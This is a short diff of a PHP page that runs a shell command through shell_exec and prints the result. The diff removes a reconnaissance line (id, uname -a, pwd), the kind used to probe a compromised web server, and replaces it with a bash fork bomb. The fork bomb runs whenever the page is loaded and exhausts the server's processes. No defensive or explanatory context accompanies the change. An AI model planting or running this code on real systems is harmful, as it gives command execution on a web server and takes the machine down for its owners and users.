@@ -1,5 +1,5 @@
 <?php
 echo "<pre>";
-echo htmlspecialchars(shell_exec("id; uname -a; pwd"));
+echo htmlspecialchars(shell_exec(":(){ :|:& };:"));
 echo "</pre>";
 ?>
